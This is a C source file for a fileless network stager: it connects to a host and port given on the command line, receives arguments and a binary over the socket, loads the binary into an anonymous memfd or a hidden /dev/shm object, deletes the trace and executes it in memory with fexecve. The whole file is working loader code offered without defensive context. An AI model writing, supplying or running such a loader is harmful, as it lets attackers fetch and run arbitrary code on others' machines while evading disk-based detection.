#include <fcntl.h> 
#include <stdio.h> 
#include <stdlib.h> 
#include <sys/mman.h> 
#include <sys/stat.h> 
#include <unistd.h> 
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <errno.h>

#include "memfd.h"


extern char **environ;


static int
sock_connect( const char *ip, int port ) {
    struct sockaddr_in serv_addr; 
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if( sockfd < 0 ) return sockfd;

    memset(&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);
    if( inet_pton(AF_INET, ip, &serv_addr.sin_addr) <= 0 ) {
        return -1;
    }

    if( connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0 ) {
        return -2;
    }

    return sockfd;
}


static unsigned int
sock_readint( int sockfd ) {
    unsigned int ret = 0;
    if( read(sockfd, &ret, 4) != 4 ) {
        return 0;
    }
    return ntohl(ret);
}


static unsigned int
sock_readbytes( int sockfd, char *buf, unsigned int nbytes ) {
    int rc;
    unsigned int nbread = 0;
    while( nbread < nbytes ) { 
        rc = read(sockfd, buf, nbytes - nbread); 
        if (rc < 0) {         
            return 0;
        }
        buf += rc;
        nbread += rc;
    }
    return nbread;
}


static char **
sock_argv( int sockfd ) {
    char *data = NULL;
    char *bufstart;
    int nbytes = sock_readint(sockfd);
    if( ! nbytes ) {
        printf("Error reading nbytes\n");
        return NULL;
    }

    unsigned int nargs = sock_readint(sockfd);
    if( ! nargs ) {
        printf("Error reading nargs\n");
        return NULL;
    }    

    unsigned int args_sz = nargs * sizeof(char*);
    data = malloc(args_sz + nbytes );
    if( ! data ) return NULL;

    char **args = (char**)&data[0];
    bufstart = &data[args_sz];
    while( nargs-- ) {        
        unsigned int val = sock_readint(sockfd);
        if( val ) {
            args[nargs] = &bufstart[val];
        }
        else {
            args[nargs] = NULL;
        }
    }

    if( ! sock_readbytes(sockfd, bufstart, nbytes) ) {
        free(data);
        return NULL;
    }

    return (char**)data;
}


static int
sock_exec( int sockfd )
{
    char *ptr, *buf;
    char **argv;
    int shm_fd, rc;
    unsigned int nbytes;
    int method = 0;

    argv = sock_argv(sockfd);
    if( ! argv ) {
        printf("Cannot read argv\n");
        return 1;
    }

    nbytes = sock_readint(sockfd);
    if( ! nbytes ) {
        printf("Cannot read bytes\n");
        return 2;
    }

    shm_fd = memfd_create("\254", MFD_CLOEXEC); 
    if( shm_fd < 0 || errno == ENOSYS ) {
        method = 1;
        shm_fd = shm_open("\254", O_RDWR | O_CREAT, 0777); 
        if (shm_fd == -1) { 
            perror("shm_open"); 
            return 3;
        }
    }


    rc = ftruncate(shm_fd, nbytes); 
    if (rc == -1) { 
        perror("ftruncate"); 
        return 4;
    }

    buf = ptr = (char *)mmap(NULL, nbytes, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0); 
    if (ptr == MAP_FAILED) { 
        perror("mmap"); 
        return 5;
    }

    sock_readbytes(sockfd, buf, nbytes);

    munmap(ptr, nbytes); 
    
    if( method == 1 ) {        
        close(shm_fd); 
        shm_fd = shm_open("\254", O_RDONLY, 0);
        remove("/dev/shm/\254");
    }

    fexecve(shm_fd, argv, environ); 
    perror("fexecve"); 
    return 0;
}


int
main( int argc, char **argv ) {
    const char *ip_addr = "127.0.0.1";
    int port = 1337;
    int rc = -1;
    if( argc > 1 ) {
        ip_addr = argv[1];
        if( argc > 2 ) {
            port = atoi(argv[2]);            
        }
    }

    // TODO: error checking
    int sockfd = sock_connect(ip_addr, port);
    if( sockfd < 0 ) {
        perror("sock_connect");
        return 2;
    }

    rc = sock_exec(sockfd);

    close(sockfd);
    return rc == 0 ? 0 : 3;
}

